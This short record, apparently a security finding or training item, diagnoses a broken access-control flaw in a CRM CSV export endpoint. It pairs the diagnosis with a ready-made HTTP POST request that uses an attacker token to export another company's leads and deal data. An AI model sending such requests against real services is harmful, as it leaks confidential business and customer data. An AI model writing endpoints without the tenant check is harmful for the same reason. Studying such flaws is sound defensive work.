diagnosis: The endpoint accepts companyId from the URL and communicates with a shared worker thread to export CRM contact details into a CSV file. Because it fails to assert that req.user.companyId equals req.params.companyId, an attacker can trigger mass exports of customer leads and sales deal sizes belonging to competing enterprises.
exploit_request:
POST /api/crm/companies/comp_enterprise_target_88/export-csv HTTP/1.1
Host: crm.salespipe.io
Authorization: Bearer <attacker_jwt>
